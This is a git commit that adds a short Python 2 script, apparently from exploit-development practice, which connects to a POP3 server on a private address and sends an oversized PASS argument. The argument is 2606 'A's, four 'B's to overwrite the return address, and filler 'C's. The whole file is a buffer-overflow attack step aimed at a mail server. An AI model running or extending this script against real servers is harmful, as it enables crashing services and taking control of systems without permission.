622f8aae3fab3e9c28c6a636d20c21996795bf89
yanbin0061 <yanbin0061@gmail.com>
2017-07-31 16:36:39 +0800

    Second

---
+++ 6.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+buffer = "A"*2606 +"B"*4+"C"*(3500-2606-4)
+try:
+    print "\n Sending evil %s bytes buffer..." % len(buffer)
+    s.connect(("10.1.131.75",110))
+    data = s.recv(1024)
+    s.send("USER test" + "\r\n")
+    data = s.recv(1024)
+    s.send("PASS " + buffer +"\r\n")
+    print "\nDone!"
+except:
+    print "Could not connect to POP3"
